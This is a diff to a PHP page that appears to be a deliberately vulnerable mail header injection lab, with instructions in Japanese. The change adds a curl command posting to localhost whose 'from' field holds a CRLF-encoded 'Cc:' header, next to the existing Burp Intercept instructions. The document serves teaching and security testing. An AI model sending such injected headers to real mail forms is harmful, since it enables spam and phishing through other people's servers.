@@ -21,7 +21,11 @@ if($_SERVER["REQUEST_METHOD"] === "POST"){
 <body>
   <h1>メールヘッダーインジェクションのサンプル</h1>
   <p>
-    Burp の Intercept などで from の値を<span><b>example-from%40example.com%0d%0aCc:%20example-cc%40example.com</b></span>に変更すると<br />
+    Burp の Intercept などで from の値を<span><b>example-from%40example.com%0d%0aCc:%20example-cc%40example.com</b></span>に変更するか<br />
+    下記のようなcurlコマンドを実行することで
+    <pre>
+      curl -i -s -k  -X $'POST' --data-binary $'from=example-from%40example.com%0d%0aCc:%20example-cc%40example.com&to=example-to%40example.com&subject=%E3%82%BF%E3%82%A4%E3%83%88%E3%83%AB&message=%E3%83%86%E3%82%B9%E3%83%88%E6%9C%AC%E6%96%87' $'http://localhost/'
+    </pre>
     <a href=<?= "http://${_SERVER['HTTP_HOST']}:1080"?> target="_blank" rel="noreferrer noopener">メーラー</a>でヘッダーが分割されてることを確認できます。
   </p>
   <form method="post">
